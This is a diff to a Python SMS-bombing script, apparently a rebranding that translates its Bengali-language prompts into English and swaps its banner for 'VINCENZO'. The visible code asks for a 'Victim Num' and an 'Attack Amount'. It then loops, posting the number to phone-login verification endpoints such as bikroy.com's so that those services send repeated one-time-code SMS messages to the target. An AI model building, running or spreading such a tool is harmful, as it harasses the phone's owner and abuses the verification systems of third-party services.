@@ -74,12 +74,12 @@ os.system('clear')
 print(bigreen+"""\t
 
             
-██████╗░██╗░██████╗██╗░░██╗░█████╗░██████╗░
-██╔══██╗██║██╔════╝██║░░██║██╔══██╗██╔══██╗
-██████╔╝██║╚█████╗░███████║███████║██║░░██║
-██╔══██╗██║░╚═══██╗██╔══██║██╔══██║██║░░██║
-██║░░██║██║██████╔╝██║░░██║██║░░██║██████╔╝
-╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░""")
+███████████████████████████
+███████████████████████████
+███████████████████████████
+███████VINCENZO█████████████
+███████████████████████████
+███████████████████████████""")
 
 
 print ("""
@@ -101,10 +101,10 @@ print ("""
 
 import requests
 from requests.structures import CaseInsensitiveDict
-number  = str(input("[>] Hello Sir Apnar Attack Num DiN: "))
+number  = str(input("[>] Hello Sir Provide Your Victim Num: "))
 
 
-amount = int(input("[>] Hello Sir Apnar Attack Er Poriman Likhun: "))
+amount = int(input("[>] Hello Sir Provide Attack Amount: "))
 
 url0 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number+""
 
@@ -171,6 +171,6 @@ for i in range(amount):
 		resp31 = requests.post(url31, headers=headers31, data=data31)
 		print(bipurple+str (i+1)+" Sms	 " +biblue+"Sent	"+bicyan+ "Succesfull ☑")
 	except:
-		print (bigreen+"EmoN SiR"+biblue+"ApnaR Phone a NeT NeY"+bicyan+" DoYa Kore Phone"+bipurple+"Network a RakhuN")
+		print (bigreen+"No Internet"+biblue+"No Internet "+bicyan+" No Intarnet"+bipurple+"No Intarnet")
 		
 	
